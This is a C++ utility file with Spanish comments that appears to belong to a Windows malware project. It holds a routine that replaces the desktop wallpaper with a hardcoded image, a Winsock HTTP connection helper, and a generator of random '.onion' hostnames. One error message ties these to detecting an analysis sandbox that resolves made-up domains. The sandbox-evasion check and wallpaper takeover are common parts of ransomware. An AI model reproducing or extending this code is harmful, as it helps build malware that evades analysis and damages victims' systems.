#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WINSOCKAPI_

#include "Utils.h"
#include <winsock2.h>
#include <ws2tcpip.h>


Utils::Utils() {};

void Utils::changeWallpaper()
{
    const wchar_t* wallpaper = L"C:\\Users\\cain\\image.png";
    //const wchar_t* wallpaper = L"C:\\Users\\rodri\\Downloads\\wallpaper2.png";

    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

BOOL Utils::HostConnection(const std::string& hostname, int port) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    const std::string request = "GET / HTTP/1.1\r\nHost: " + hostname + "\r\nConnection: close\r\n\r\n";
    char recvbuf[512];
    int iResult;
    int recvbuflen = 512;

    // Inicializa Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup falló con el error: " << iResult << std::endl;
        return FALSE;
    }

    // Configura los hints
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolver la dirección del servidor
    iResult = getaddrinfo(hostname.c_str(), std::to_string(port).c_str(), &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo falló, posible entorno de sandbox que responde a nombres de host aleatorios." << std::endl;
        WSACleanup();
        return FALSE;
    }

    // Intentar conectarse al servidor
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Crear un socket
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cerr << "Error al crear el socket: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return FALSE;
        }

        // Conectarse al servidor
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "No se pudo conectar al servidor." << std::endl;
        WSACleanup();
        return FALSE;
    }

    // Enviar una solicitud HTTP GET
    iResult = send(ConnectSocket, request.c_str(), (int)request.length(), 0);
    if (iResult == SOCKET_ERROR) {
        std::cerr << "send falló con el error: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return FALSE;
    }

    // Recibir la respuesta del servidor
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            //std::cout.write(recvbuf, iResult);
        }
        else if (iResult == 0)
            std::cout << "Conexión cerrada" << std::endl;
        else {
            std::cerr << "recv falló con el error: " << WSAGetLastError() << std::endl;
            closesocket(ConnectSocket);
            WSACleanup();
            return FALSE;
        }
    } while (iResult > 0);

    // Limpiar
    closesocket(ConnectSocket);
    WSACleanup();

    return TRUE;
}

std::string Utils::getRandomDomain(void) {
    std::string randomDomain = "www." + Utils::generateRandomString() + ".onion";
    return randomDomain;
}

std::string Utils::generateRandomString(void) {
	std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	std::string result;

	srand(static_cast<unsigned int>(time(0)));

	for (int i = 0; i < 64; i++) {
		result += chars[rand() % chars.size()];
	}

	return result;
}

std::wstring Utils::StringToWstring(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

